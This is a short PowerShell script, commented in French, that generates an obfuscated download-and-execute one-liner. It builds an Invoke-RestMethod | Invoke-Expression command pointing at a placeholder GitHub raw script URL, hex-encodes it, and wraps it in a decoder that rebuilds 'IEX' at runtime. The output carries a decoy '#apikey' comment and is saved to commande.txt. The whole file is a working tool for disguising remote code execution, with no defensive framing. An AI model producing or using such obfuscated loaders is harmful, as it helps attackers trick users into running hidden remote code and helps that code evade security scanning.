# Script pour encoder une commande PowerShell en hex (comme commande.txt)

param(
    [string]$Url = "https://raw.githubusercontent.com/TON_USERNAME/TON_REPO/refs/heads/main/script.ps1"
)

Write-Host "=== ENCODAGE DE LA COMMANDE ===" -ForegroundColor Cyan
Write-Host ""

# Construire la commande complète
$command = "Invoke-RestMethod -Uri `"$Url`" |Invoke-Expression"

Write-Host "Commande originale:" -ForegroundColor Yellow
Write-Host $command
Write-Host ""

# Encoder en hex
$hex = ($command.ToCharArray() | ForEach-Object { [System.Convert]::ToInt32($_) -as [char] | ForEach-Object { '{0:X2}' -f [int][char]$_ }) -join ''

Write-Host "Commande encodée en hex:" -ForegroundColor Green
Write-Host $hex
Write-Host ""

# Créer la commande obfusquée complète
$obfuscated = "&(`$(&{`$a=`$args[0];`$r='';for(`$i=0;`$i-lt`$a.Length;`$i=`$i+2){`$r+=`"`$([char](0+('0x'+`$a[`$i]+`$a[`$i+1])))`"};`$r} '494558') (`$(&{`$a=`$args[0];`$r='';for(`$i=0;`$i-lt`$a.Length;`$i=`$i+2){`$r+=`"`$([char](0+('0x'+`$a[`$i]+`$a[`$i+1])))`"};`$r} '$hex') #apikey"

Write-Host "Commande obfusquée complète:" -ForegroundColor Cyan
Write-Host $obfuscated
Write-Host ""

# Sauvegarder dans commande.txt
$obfuscated | Out-File -FilePath "commande.txt" -Encoding ASCII -NoNewline
Write-Host "✓ Commande sauvegardée dans commande.txt" -ForegroundColor Green
Write-Host ""

